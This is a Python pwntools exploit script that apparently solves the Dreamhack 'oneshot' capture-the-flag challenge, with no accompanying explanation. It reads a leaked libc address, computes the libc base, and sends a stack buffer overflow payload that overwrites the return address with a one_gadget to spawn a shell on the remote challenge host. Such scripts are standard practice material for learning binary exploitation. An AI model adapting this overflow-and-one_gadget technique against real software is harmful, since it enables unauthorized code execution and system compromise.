#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  18079
HOST = "host3.dreamhack.games"
exe = context.binary = ELF("./oneshot_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*main+102
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.recvuntil(b"stdout: ")
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
log.info("libc_leak: " + hex(libc_leak))
log.info("libc_base: " + hex(libc.address))
# GDB()

one_gadget = libc.address + 0x45216
pl = flat(b"A"*0x18, 0, b"A"*8, one_gadget)
p.sendafter(b"MSG: ",pl)


p.interactive()